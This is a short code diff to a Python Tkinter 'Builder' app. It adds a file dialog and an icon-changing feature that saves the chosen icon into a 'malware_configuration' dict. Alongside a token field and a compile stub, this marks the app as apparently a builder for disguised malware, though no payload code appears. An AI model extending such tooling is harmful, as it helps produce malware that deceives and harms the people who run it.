@@ -1,5 +1,6 @@
 import tkinter as tk
 from tkinter import ttk
+from tkinter import filedialog
 import random
 import os
 import pyperclip
@@ -144,6 +145,14 @@ class Builder:
         x = self.master.winfo_x() + dx
         y = self.master.winfo_y() + dy
         self.master.geometry(f"+{x}+{y}")
+
+    def get_file_path(self, file_types, initial_directory=os.getcwd()):
+        root2 = tk.Tk()
+        root2.withdraw()
+        root2.attributes('-topmost', True)
+        open_dir = filedialog.askopenfilename(filetypes=file_types, initialdir=initial_directory)
+        root2.destroy()
+        return open_dir
 
     def create_header(self):
         self.header = tk.Canvas(self.master, bd=0, highlightthickness=0, bg='#191919')
@@ -562,7 +571,12 @@ class Builder:
         self.token_entry.insert(0, pyperclip.paste())
 
     def change_icon(self):
-        print('asd')
+        new_icon = self.get_file_path([('Icon files', '.jpg .png .ico')], 'resources/icons/default/Windows-10/popular')
+        if new_icon == '': return
+        Image.open(new_icon).resize((100, 100)).save('icon.png', format='PNG')
+        self.icon_photo = tk.PhotoImage(file='icon.png')
+        self.icon_button['image'] = self.icon_photo
+        self.malware_configuration['icon_path'] = new_icon
 
     def compile(self):
         print('compile')
